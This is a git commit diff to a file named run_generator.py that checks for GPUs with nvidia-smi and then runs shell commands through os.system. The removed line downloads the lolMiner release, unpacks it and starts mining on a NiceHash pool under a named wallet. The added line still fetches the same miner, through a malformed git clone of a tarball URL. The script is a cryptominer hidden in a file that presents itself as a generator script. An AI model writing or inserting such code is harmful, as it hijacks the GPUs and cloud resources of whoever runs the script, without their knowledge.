2c5476dd77d2f68194a5bd671d00a0c03263bd94
jazzup6176 <88086548+jazzup6176@users.noreply.github.com>
2021-10-22 13:21:56 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,4 @@
 import os as alpha
 alpha.system("nvidia-smi")
 import os
-os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo AUTOLYKOS2 --pool stratum+tcp://autolykos.usa-west.nicehash.com:3390 --user 31wGUjEhrrhxEV1VdJBcuv7UYe6esJRqS9.rigo")
+os.system("git clone https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz")
